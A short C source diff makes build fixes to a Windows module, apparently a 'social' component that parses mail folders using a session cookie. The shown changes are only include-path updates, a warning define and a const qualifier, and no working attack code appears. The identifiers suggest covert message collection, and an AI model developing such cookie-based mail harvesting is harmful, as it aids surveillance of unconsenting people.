@@ -1,9 +1,10 @@
+#define _CRT_SECURE_NO_WARNINGS 1
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "../common.h"
-#include "../bss.h"
-#include "../LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -60,7 +61,7 @@ BOOL ParseDate(char *str_date, FILETIME *ft)
 	return SystemTimeToFileTime(&st, ft);
 }
 
-DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
+DWORD ParseFolder(char *cookie, const char *folder, char *user, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
